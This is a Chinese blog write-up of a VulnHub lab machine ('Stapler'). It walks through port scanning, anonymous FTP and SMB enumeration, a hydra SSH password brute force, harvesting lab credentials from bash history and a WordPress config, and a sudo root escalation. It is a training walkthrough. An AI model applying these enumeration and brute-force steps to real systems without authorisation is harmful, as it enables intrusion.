---
layout: post
title: "vulnhub靶场之stapler靶机"
date: 2025-03-15 22:37:17 +0800
description: "该靶机主要就是枚举，枚举，枚举！！！！FTP服务的匿名探测SMB服务的用户名枚举SSH服务的暴力破解靶机内信息收集，找到的密码最终提权，就是不同用户直接的切换。"
keywords: "vulnhub靶场之stapler靶机"
categories: ['Oscp']
tags: ['网络安全', '网络', '安全', '学习', 'Web']
artid: "146286939"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146286939
    alt: "vulnhub靶场之stapler靶机"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146286939
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146286939
cover: https://bing.ee123.net/img/rand?artid=146286939
image: https://bing.ee123.net/img/rand?artid=146286939
img: https://bing.ee123.net/img/rand?artid=146286939
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     vulnhub靶场之stapler靶机
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="markdown_views prism-atom-one-light" id="content_views">
    <svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
     <path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
     </path>
    </svg>
    <h2>
     <a id="_0">
     </a>
     前言
    </h2>
    <p>
     靶机：
     <code>
      stapler
     </code>
     靶机，IP地址为
     <code>
      192.168.10.12
     </code>
    </p>
    <p>
     攻击：
     <code>
      kali
     </code>
     ，IP地址为
     <code>
      192.168.10.6
     </code>
    </p>
    <p>
     靶机采用
     <code>
      virtualbox
     </code>
     ，攻击机采用
     <code>
      VMware
     </code>
     虚拟机，都采用桥接网卡模式
    </p>
    <blockquote>
     <p>
      文章涉及的靶机及工具，都可以自行访问官网或者项目地址进行获取，或者通过网盘链接下载
      <code>
       https://pan.quark.cn/s/ee513814fee2
      </code>
     </p>
    </blockquote>
    <h2>
     <a id="_10">
     </a>
     主机发现
    </h2>
    <p>
     也就是相当于现实环境中去发现确定主机的
     <code>
      ip
     </code>
     地址，因为这里是靶机环境，所以跳过了从域名到
     <code>
      ip
     </code>
     地址的过程。
    </p>
    <p>
     使用
     <code>
      arp-scan -l
     </code>
     或者
     <code>
      netdiscovery -r 192.168.10.1/24
     </code>
    </p>
    <p>
     当然也可以使用
     <code>
      nmap
     </code>
     等工具进行
    </p>
    <pre><code class="prism language-shell">netdiscover <span class="token parameter variable">-r</span> <span class="token number">192.168</span>.10.1/24
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/5f7fe19c9aaad781c87232e0572ca587.jpeg"/>
    </p>
    <h2>
     <a id="_24">
     </a>
     信息收集
    </h2>
    <h3>
     <a id="nmap_26">
     </a>
     使用nmap扫描目标端口等信息
    </h3>
    <p>
     首先扫描目标的
     <code>
      tcp
     </code>
     端口的开放情况
    </p>
    <pre><code class="prism language-shell">nmap <span class="token parameter variable">-sT</span> --min-rate<span class="token operator">=</span><span class="token number">1000</span> <span class="token number">192.168</span>.10.12 -p- <span class="token parameter variable">-oA</span> nmap-tcp
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/cdf6be23f0d3c67d6b983b018a8f71fd.jpeg"/>
    </p>
    <p>
     再扫描
     <code>
      udp
     </code>
     端口的开放情况
    </p>
    <pre><code class="prism language-shell">nmap <span class="token parameter variable">-sU</span> --min-rate<span class="token operator">=</span><span class="token number">1000</span> <span class="token number">192.168</span>.10.12 --top-ports <span class="token number">20</span> <span class="token parameter variable">-oA</span> nmap-udp
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/114771b966aefa2a1f44d19f20c0c731.jpeg"/>
    </p>
    <p>
     可以看到明确开放的
     <code>
      udp
     </code>
     端口没有，所以下面对
     <code>
      tcp
     </code>
     端口进行一个筛选
    </p>
    <pre><code class="prism language-shell"><span class="token assign-left variable">ports</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">grep</span> <span class="token function">open</span> nmap-tcp.nmap <span class="token operator">|</span> <span class="token function">awk</span> -F<span class="token string">'/'</span> <span class="token string">'{print $1}'</span> <span class="token operator">|</span> <span class="token function">paste</span> <span class="token parameter variable">-sd</span> <span class="token string">','</span><span class="token variable">`</span></span>
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/9d7c30f2dcf6d4291d280e28b6e7a2e3.jpeg"/>
    </p>
    <p>
     进一步对这些端口进行服务、系统等探测
    </p>
    <pre><code class="prism language-shell">nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">-O</span> <span class="token parameter variable">-sC</span> <span class="token number">192.168</span>.10.12 <span class="token parameter variable">-p</span> <span class="token variable">$ports</span> --min-rate<span class="token operator">=</span><span class="token number">1000</span> <span class="token parameter variable">-oA</span> detail
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/46ae5616d28150f8c6d9874118002f6d.jpeg"/>
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/8196d15c4e676117f464654ac2479ac1.jpeg"/>
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/53a284b456bcacf5070b207ced9b9ffc.jpeg"/>
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/3504f3f12662ee84d0f28c3cf3674a7c.jpeg"/>
    </p>
    <p>
     再使用
     <code>
      nmap
     </code>
     的漏洞检测脚本对这些端口进行探测
    </p>
    <pre><code class="prism language-shell">nmap <span class="token parameter variable">--script</span><span class="token operator">=</span>vuln <span class="token number">192.168</span>.10.12 <span class="token parameter variable">-p</span> <span class="token variable">$ports</span> <span class="token parameter variable">-oA</span> vuln
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/c39ac69c91083bbe2842514643fc10d8.jpeg"/>
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/af586302a2e11a34e2916c0e70c48a3c.jpeg"/>
    </p>
    <p>
     信息小结：
    </p>
    <table>
     <thead>
      <tr>
       <th>
        端口
       </th>
       <th>
        服务
       </th>
       <th>
        版本
       </th>
      </tr>
     </thead>
     <tbody>
      <tr>
       <td>
        21
       </td>
       <td>
        ftp
       </td>
       <td>
        vsftpd 2.0.8
       </td>
      </tr>
      <tr>
       <td>
        22
       </td>
       <td>
        ssh
       </td>
       <td>
        openssh 7.2p2
       </td>
      </tr>
      <tr>
       <td>
        53
       </td>
       <td>
        domain
       </td>
       <td>
        dnsmasq 2.75
       </td>
      </tr>
      <tr>
       <td>
        80
       </td>
       <td>
        http
       </td>
       <td>
        php cli server 5.5
       </td>
      </tr>
      <tr>
       <td>
        139
       </td>
       <td>
        samba
       </td>
       <td>
        smbd
       </td>
      </tr>
      <tr>
       <td>
        666
       </td>
       <td>
       </td>
       <td>
       </td>
      </tr>
      <tr>
       <td>
        3306
       </td>
       <td>
        mysql
       </td>
       <td>
        mysql 5.7.12
       </td>
      </tr>
      <tr>
       <td>
        12380
       </td>
       <td>
        http
       </td>
       <td>
        apache httpd 2.4.18
       </td>
      </tr>
     </tbody>
    </table>
    <h3>
     <a id="FTP_89">
     </a>
     FTP信息探测
    </h3>
    <p>
     使用
     <code>
      anonymous
     </code>
     匿名空密码登录
    </p>
    <pre><code class="prism language-shell"><span class="token function">ftp</span> anonymous@192.168.10.12
<span class="token function">ls</span> <span class="token parameter variable">-la</span>
get note
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/17954617fdecee1dbe35e9ec702ca720.jpeg"/>
    </p>
    <p>
     查看
     <code>
      note
     </code>
     ，又有发现
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/6bf1a4a7162d62086e4b7bd4676415b9.jpeg"/>
    </p>
    <p>
     信息小结，获取三个用户名
    </p>
    <pre><code class="prism language-shell">harry
elly
john
</code></pre>
    <h3>
     <a id="SMB_115">
     </a>
     SMB探测
    </h3>
    <p>
     使用
     <code>
      enum4linux
     </code>
     探测服务
    </p>
    <pre><code class="prism language-shell">enum4linux <span class="token number">192.168</span>.10.12 <span class="token parameter variable">-a</span>
</code></pre>
    <p>
     可以看到有几个共享
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/08bdfeddd65512ba710ada3fd49b0aa2.jpeg"/>
    </p>
    <p>
     以及一堆用户名
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/7ced5e020bfaca38cdf6391d9c55c44a.jpeg"/>
    </p>
    <p>
     或者使用
     <code>
      nmap
     </code>
     的脚本进行探测
    </p>
    <pre><code class="prism language-shell">nmap <span class="token parameter variable">--script</span><span class="token operator">=</span>smb* <span class="token number">192.168</span>.10.12
</code></pre>
    <p>
     共享出的一样，只是这里明确列举出了共享中的文件
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/4e1463798ae4a6ecbc7f8f97a7d4f89d.jpeg"/>
    </p>
    <p>
     使用
     <code>
      smbclient
     </code>
     查看或者连接也行
    </p>
    <pre><code class="prism language-shell">smbclient <span class="token parameter variable">-L</span> //192.168.10.12
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/01d59ffab2418c1580aa49b26303adff.jpeg"/>
    </p>
    <p>
     使用
     <code>
      smbclient
     </code>
     连接
     <code>
      kathy
     </code>
     共享
    </p>
    <pre><code class="prism language-shell">smbclient //192.168.10.12/kathy <span class="token parameter variable">-N</span>

smb: <span class="token punctuation">\</span><span class="token operator">&gt;</span> prompt		<span class="token comment">#关闭交互</span>
smb: <span class="token punctuation">\</span><span class="token operator">&gt;</span> recurse		<span class="token comment">#开启递归</span>
smb: <span class="token punctuation">\</span><span class="token operator">&gt;</span> mget *		<span class="token comment">#下载所有</span>
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/42fe08676be65696d0e355e14fe46875.jpeg"/>
    </p>
    <p>
     再连接
     <code>
      tmp
     </code>
     共享，下载所有文件
    </p>
    <pre><code class="prism language-shell">smbclient //192.168.10.12/tmp <span class="token parameter variable">-N</span>

smb: <span class="token punctuation">\</span><span class="token operator">&gt;</span> prompt		<span class="token comment">#关闭交互</span>
smb: <span class="token punctuation">\</span><span class="token operator">&gt;</span> recurse		<span class="token comment">#开启递归</span>
smb: <span class="token punctuation">\</span><span class="token operator">&gt;</span> mget *		<span class="token comment">#下载所有</span>
</code></pre>
    <p>
     查看文件构造，发现一个压缩包，一个
     <code>
      txt
     </code>
     文件
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/48148f18a020c96abbc1c68e0fa6ba19.jpeg"/>
    </p>
    <p>
     查看相关文件，发现一个用户名
     <code>
      kathy
     </code>
     ，以及
     <code>
      wordpress
     </code>
     的备份文件
    </p>
    <pre><code class="prism language-shell"><span class="token comment">#解压文件</span>
<span class="token function">tar</span> <span class="token parameter variable">-zxf</span> wordpress-4.tar.gz
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/38ee76ca8b42a032faf433098f31ae26.jpeg"/>
    </p>
    <p>
     不过查看了很久，并没有发现连接数据库的配置文件
    </p>
    <p>
     查看
     <code>
      ls
     </code>
     文件，发现只是一种记录
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/8353aa9feacb7b8bf14a6895ff60dbbc.jpeg"/>
    </p>
    <p>
     信息小结：
    </p>
    <p>
     获取众多用户名，把前面获取的用户名都放在一起，做成字典
    </p>
    <pre><code class="prism language-shell">peter
RNunemaker
ETollefson
DSwanger
AParnell
SHayslett
MBassin
JBare
LSolum
IChadwick
MFrei
SStroud
CCeaser
JKanode
CJoo
Eeth
LSolum2
JLipps
jamie
Sam
Drew
jess
SHAY
Taylor
mel
kai
zoe
NATHAN
www
elly
kathy
harry
john
</code></pre>
    <h3>
     <a id="_230">
     </a>
     网站信息探测
    </h3>
    <h6>
     <a id="80_232">
     </a>
     访问80端口的网站
    </h6>
    <p>
     并没有发现东西，并且页面源代码也没有内容
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/60e2c905e45d4166b37b823cbe7be022.jpeg"/>
    </p>
    <p>
     使用
     <code>
      gobuster
     </code>
     等工具进行目录爆破
    </p>
    <pre><code class="prism language-shell">gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://192.168.10.12 <span class="token parameter variable">-w</span> /usr/share/wordlists/dirb/big.txt <span class="token parameter variable">-b</span> <span class="token number">404</span> <span class="token parameter variable">-x</span> php,html,txt,md       
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/9541cb403e107f533b6dca33bf1185a7.jpeg"/>
    </p>
    <p>
     访问这两个发现直接下载，并且这两个文件，一般是在某个用户的主目录下的，猜测这个网站，可能就是以某个用户的主目录为网站目录的
    </p>
    <p>
     在测试
     <code>
      .ssh/id_rsa
     </code>
     无果后，暂且搁置该网站
    </p>
    <h6>
     <a id="12380_252">
     </a>
     访问12380网站
    </h6>
    <p>
     可以看到，主界面没有任何内容，并且页面源代码中也没有内容
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/0297ae7d1a75a75513893d05bf62931a.jpeg"/>
    </p>
    <p>
     使用
     <code>
      dirb
     </code>
     进行网站扫描，没有出现任何内容
    </p>
    <pre><code class="prism language-shell">dirb http://192.168.10.12:12380
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/4aaf7bad8a2e39d619f2b4363d748a11.jpeg"/>
    </p>
    <h2>
     <a id="_268">
     </a>
     密码爆破
    </h2>
    <p>
     目前只有大量的用户名，并没有其他东西，以之前整理后的
     <code>
      user
     </code>
     ，进行密码爆破
    </p>
    <pre><code class="prism language-shell">hydra <span class="token parameter variable">-L</span> username <span class="token parameter variable">-P</span> /usr/share/wordlists/fasttrack.txt <span class="token number">192.168</span>.10.12 <span class="token function">ssh</span>
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/601ab5aeee4bdb453ee7ac54207ea637.jpeg"/>
    </p>
    <p>
     爆破出三个，随便以这用户进行登录，发现基本上没有什么内容，并且用户众多
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/1531c4bf3949b31b981f4996de05c085.jpeg"/>
    </p>
    <p>
     一个个访问这些目录，只有在
     <code>
      JKanode
     </code>
     用户的目录下，发现命令历史记录中具有信息
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/3bc4060c7b65f41441fb9cbab3672bcf.jpeg"/>
    </p>
    <pre><code class="prism language-shell">sshpass <span class="token parameter variable">-p</span> thisimypassword <span class="token function">ssh</span> JKanode@localhost
sshpass <span class="token parameter variable">-p</span> JZQuyIN5 peter@localhost
</code></pre>
    <p>
     经测试，上面这两个可以作为ssh登录，这里开始整理信息
    </p>
    <table>
     <thead>
      <tr>
       <th>
        用户名
       </th>
       <th>
        密码
       </th>
      </tr>
     </thead>
     <tbody>
      <tr>
       <td>
        MFrei
       </td>
       <td>
        letmein
       </td>
      </tr>
      <tr>
       <td>
        CJoo
       </td>
       <td>
        summer2017
       </td>
      </tr>
      <tr>
       <td>
        Drew
       </td>
       <td>
        qwerty
       </td>
      </tr>
      <tr>
       <td>
        JKanode
       </td>
       <td>
        thisimypassword
       </td>
      </tr>
      <tr>
       <td>
        peter
       </td>
       <td>
        JZQuyIN5
       </td>
      </tr>
     </tbody>
    </table>
    <p>
     这里查看网站，发现在
     <code>
      /var/www/https/blogblog/wp-config.php
     </code>
     的配置文件，有连接数据库的配置
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/b20ffe9b56225b51a4e5127cc58b2935.jpeg"/>
    </p>
    <p>
     发现密码
     <code>
      plbkac
     </code>
     ，并且连接数据库的是以
     <code>
      root
     </code>
     执行的
    </p>
    <p>
     查看
     <code>
      wordpress
     </code>
     数据库，发现其中的一些用户，不过都是加密处理的，不知道其算法
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/debc5b07ae8707b232731a3ad26d9357.jpeg"/>
    </p>
    <h2>
     <a id="_311">
     </a>
     提权
    </h2>
    <p>
     这里可能存在
     <code>
      mysql udf
     </code>
     提权，但是这里测试发现，不想，因为
     <code>
      mysql
     </code>
     版本大于
     <code>
      5.0
     </code>
     ，并且插件的所在路径对于非
     <code>
      root
     </code>
     用户没有写入权限，所以无法提权
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/75d388b806cbc1b1f4ec249163253fa1.jpeg"/>
    </p>
    <p>
     从前面所有用户下手，并且使用
     <code>
      find
     </code>
     寻找具有SUID权限的文件
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/9ab106643ee9c15591de64e27f38edd7.jpeg"/>
    </p>
    <p>
     不过最终只有在
     <code>
      peter
     </code>
     用户不一样，登录界面就不同
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/3c2ae4efa660d47c05de9cd1ca2f96f4.jpeg"/>
    </p>
    <p>
     以
     <code>
      peter
     </code>
     使用
     <code>
      sudo -l
     </code>
     发现完全
     <code>
      ok
     </code>
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/f2d0bed999c8698d3b6677b8c84f819d.jpeg"/>
    </p>
    <p>
     直接
     <code>
      sudo /bin/bash -p
     </code>
     提权
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/10bb826195650a6f636d59f87345080e.jpeg"/>
    </p>
    <p>
     查看最终
     <code>
      flag
     </code>
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/74b09b984550efbf691745a825ea2ecb.jpeg"/>
    </p>
    <h2>
     <a id="_337">
     </a>
     总结
    </h2>
    <p>
     该靶机主要就是枚举，枚举，枚举！！！！
    </p>
    <ol>
     <li>
      FTP服务的匿名探测
     </li>
     <li>
      SMB服务的用户名枚举
     </li>
     <li>
      SSH服务的暴力破解
     </li>
     <li>
      靶机内信息收集，找到的密码
     </li>
     <li>
      最终提权，就是不同用户直接的切换
     </li>
    </ol>
   </div>
   <link href="../../assets/css/markdown_views-a5d25dd831.css" rel="stylesheet"/>
   <link href="../../assets/css/style-e504d6a974.css" rel="stylesheet"/>
  </div>
 </article>
 <p alt="68747470733a2f2f626c:6f672e6373646e2e6e65742f4368696e615f495f4c4f56452f:61727469636c652f64657461696c732f313436323836393339" class_="artid" style="display:none">
 </p>
</div>


